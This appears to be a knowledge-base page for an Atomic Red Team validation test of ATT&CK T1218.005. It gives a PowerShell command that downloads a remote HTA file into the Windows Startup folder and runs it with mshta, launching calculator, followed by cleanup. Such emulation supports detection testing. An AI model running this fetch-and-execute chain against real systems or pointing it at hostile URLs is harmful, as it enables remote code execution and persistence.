---
atomic_guid: "c4b97eeb-5249-4455-a607-59f95485cb45"
title: "Mshta Executes Remote HTML Application (HTA)"
framework: "atomic"
generated: "true"
attack_technique_id: "T1218.005"
attack_technique_name: "Signed Binary Proxy Execution: Mshta"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218.005/T1218.005.yaml"
build_date: "2026-04-27 19:12:27"
executor: "powershell"
aliases:
  - "c4b97eeb-5249-4455-a607-59f95485cb45"
  - "Mshta Executes Remote HTML Application (HTA)"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[kb/lolbas/index|LOLBAS]] • [[workspaces/index|Notes]]

Execute an arbitrary remote HTA. Upon execution calc.exe will be launched.

## ATT&CK Mapping

- [[kb/attack/techniques/T1218-system_binary_proxy_execution#^t1218005-mshta|T1218.005: Mshta]]

## Input Arguments

### hta_url

- description: URL to HTA file for execution
- type: string
- default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.005/src/T1218.005.hta

### temp_file

- description: temp_file location for hta
- type: string
- default: $env:appdata\Microsoft\Windows\Start Menu\Programs\Startup\T1218.005.hta

## Executor

- name: powershell

### Command

```powershell
$var =Invoke-WebRequest "#{hta_url}"
$var.content|out-file "#{temp_file}"
mshta "#{temp_file}"
start-sleep -s 15
stop-process -name "calculator" -Force -ErrorAction Ignore
stop-process -name "CalculatorApp" -Force -ErrorAction Ignore
```

### Cleanup

```powershell
remove-item "#{temp_file}" -ErrorAction Ignore
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218.005/T1218.005.yaml)
